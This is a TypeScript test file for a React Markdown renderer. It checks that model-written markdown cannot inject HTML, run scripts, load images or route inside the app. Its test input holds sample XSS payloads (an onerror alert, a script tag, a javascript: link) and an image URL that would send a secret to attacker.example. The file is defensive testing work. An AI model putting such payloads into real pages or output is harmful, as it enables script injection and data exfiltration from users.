import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "../apps/web/src/markdown.js";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

test("model-written markdown cannot add markup, run scripts, load images or navigate the app", () => {
  const html = render([
    `<img src="x" onerror="alert(1)"> <script>alert(2)</script>`,
    `[run](javascript:alert(3)) ![pixel](https://attacker.example/p.png?d=secret) [file](src/main.ts) [route](#/settings)`,
  ].join("\n\n"));
  assert.doesNotMatch(html, /<img|<script|javascript:|href="(?!https:)/i);
  assert.match(html, /&lt;script&gt;alert\(2\)&lt;\/script&gt;/);
  assert.match(html, /<a href="https:\/\/attacker\.example\/p\.png\?d=secret" target="_blank" rel="noopener noreferrer">pixel<\/a>/);
});

test("a linked image is that link's text, so the link keeps its own target", () => {
  const html = render("[![CI](https://img.shields.io/ci.svg)](https://github.com/o/r/actions)");
  assert.equal(html, '<div class="markdown"><p><a href="https://github.com/o/r/actions" target="_blank" rel="noopener noreferrer">CI</a></p></div>');
});
